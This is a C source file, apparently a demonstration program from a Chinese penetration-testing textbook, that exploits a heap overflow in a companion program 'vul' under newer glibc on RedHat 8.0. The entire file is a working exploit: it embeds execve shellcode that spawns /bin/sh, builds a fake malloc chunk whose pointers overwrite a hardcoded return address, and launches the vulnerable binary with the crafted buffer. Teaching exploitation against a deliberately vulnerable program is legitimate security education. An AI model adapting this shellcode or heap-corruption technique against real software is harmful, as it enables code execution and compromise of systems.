/* exp.c
*
*  《网络渗透技术》演示程序
*  作者：san, alert7, eyas, watercloud
*
*  针对vul.c的堆溢出利用程序，使用新版本glibc的情况
*  测试平台：RedHat 8.0
*/

#include <stdio.h>
#include <stdlib.h>

#define RETLOC          0x0804959c+4
#define VUL             "./vul"

#define PREV_INUSE      0x1
#define IS_MMAPPED      0x2
#define NON_MAIN_ARENA  0x4

char shellcode[] =
"\xeb\x0a\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69"
"\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80";

main (int argc, char **argv)
{
    char    buf[1024];
    char    *args[] = {VUL, buf, NULL};
    char    *env[]  = {shellcode, NULL};

    unsigned int retloc = RETLOC;
    unsigned int shaddr = 0xbffffffc - (strlen(VUL) + 1) - (strlen(shellcode) + 1);
    unsigned int fake_chunk[] = {
        0x41414141,
        0x41414141 | PREV_INUSE,
        0x41414141,
        0xfffffffc,
        0xfffffff0,
        0xfffffff8 & ~(PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA),
        retloc - 12,
        shaddr,
        0x41414141,
        0x41414141,
        retloc - 12,
        shaddr,
    };

    memset(buf, 0, sizeof(buf));
    memcpy(buf, fake_chunk, sizeof(fake_chunk));

    execve(args[0], args, env);
} /* End of main */
